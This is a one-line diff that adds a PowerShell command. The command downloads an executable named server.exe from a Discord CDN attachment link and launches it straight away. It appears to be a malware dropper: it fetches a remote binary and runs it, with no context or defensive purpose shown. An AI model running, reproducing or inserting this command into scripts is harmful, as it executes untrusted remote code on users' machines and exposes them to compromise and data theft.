@@ -1,0 +1,1 @@
+$u="https://cdn.discordapp.com/attachments/1400837947422675015/1462049751636639805/server.exe?ex=696cc770&is=696b75f0&hm=af419cac9d323db110a1b285d05223f2d1672a3661f005800938e36a3b07845a"; Invoke-WebRequest $u -OutFile server.exe; Start-Process server.exe
